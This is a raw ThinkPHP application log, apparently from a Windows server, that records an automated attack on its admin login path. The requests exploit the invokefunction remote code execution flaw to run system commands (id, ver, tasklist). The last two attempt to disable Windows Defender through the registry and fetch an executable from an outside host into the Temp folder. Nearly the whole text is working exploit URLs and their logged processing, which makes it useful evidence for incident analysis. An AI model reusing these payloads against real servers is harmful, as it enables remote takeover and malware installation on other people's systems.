+---------------------------------------------------------------
+[ 2019-01-04T23:21:36+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T23:21:42+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.062400s][吞吐率：16.03req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T23:21:47+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.171601s][吞吐率：5.83req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T23:21:48+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T23:21:50+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.436801s][吞吐率：2.29req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T23:24:57+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FDCYDI47XUC.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FDCYDI47XUC.exe [运行时间：0.093601s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/DCYDI47XUC.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T23:25:01+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FDCYDI47XUC.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FDCYDI47XUC.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/DCYDI47XUC.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
